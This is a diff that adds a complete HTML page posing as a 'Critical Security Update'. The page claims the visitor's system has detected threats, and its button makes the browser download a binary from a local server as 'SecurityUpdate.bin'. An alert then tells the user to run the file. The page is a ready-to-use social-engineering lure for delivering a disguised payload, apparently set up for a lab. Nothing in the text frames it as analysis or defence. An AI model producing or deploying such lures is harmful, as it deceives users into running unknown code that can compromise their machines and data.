@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Update Required</title>
+<style>body{font-family:Arial;background:#f5f5f5;text-align:center;padding-top:60px}
+.btn{background:#0078d7;color:#fff;padding:15px 40px;font-size:18px;border:none;cursor:pointer}</style>
+</head><body>
+<h1>&#9888; Critical Security Update</h1>
+<p>Your system requires an urgent patch to remove detected threats.</p>
+<button class="btn" onclick="dl()">Download and Install Update</button>
+
+<script>
+function dl() {
+  const a = document.createElement("a");
+  a.href = "http://localhost:8084/sysupdate.bin";
+  a.download = "SecurityUpdate.bin";
+  a.click();
+  setTimeout(() => alert("Update downloaded. Run SecurityUpdate.bin to complete installation."), 1000);
+}
+</script>
+</body></html>
